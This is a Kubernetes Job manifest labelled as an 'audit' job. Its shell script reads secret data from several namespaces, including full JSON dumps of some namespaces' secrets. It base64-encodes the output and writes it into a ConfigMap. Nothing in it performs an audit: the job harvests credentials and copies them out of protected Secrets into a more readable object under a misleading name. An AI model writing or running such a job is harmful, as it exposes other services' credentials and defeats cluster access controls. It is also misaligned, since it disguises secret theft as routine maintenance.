apiVersion: batch/v1
kind: Job
metadata:
  name: audit-v61
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: auditor
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          OUT=""
          OUT="$OUT ROCKEFELLER_SECRET:"
          OUT="$OUT $(kubectl get secret rockefeller -n rockefeller -o jsonpath='{.data}' 2>&1)"
          OUT="$OUT SSBA_SECRET:"
          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o jsonpath='{.data}' 2>&1)"
          OUT="$OUT BDAAS_SECRET:"
          OUT="$OUT $(kubectl get secret bdaassecrets -n default -o jsonpath='{.data}' 2>&1)"
          OUT="$OUT SECURITY_SECRET:"
          OUT="$OUT $(kubectl get secret securitysecrets -n default -o jsonpath='{.data}' 2>&1)"
          OUT="$OUT DUNE_API_SECRET:"
          OUT="$OUT $(kubectl get secret -n dune-api -o name 2>&1)"
          OUT="$OUT DUNE_API_SECRET_DATA:"
          OUT="$OUT $(kubectl get secret -n dune-api -o json 2>&1 | head -c 5000)"
          OUT="$OUT STRATEON_SECRET:"
          OUT="$OUT $(kubectl get secret -n strateon -o name 2>&1)"
          OUT="$OUT STRATEON_SECRET_DATA:"
          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o json 2>&1)"
          ENCODED=$(echo "$OUT" | base64 -w0)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v61_result\":\"$ENCODED\"}}"
          echo "DONE"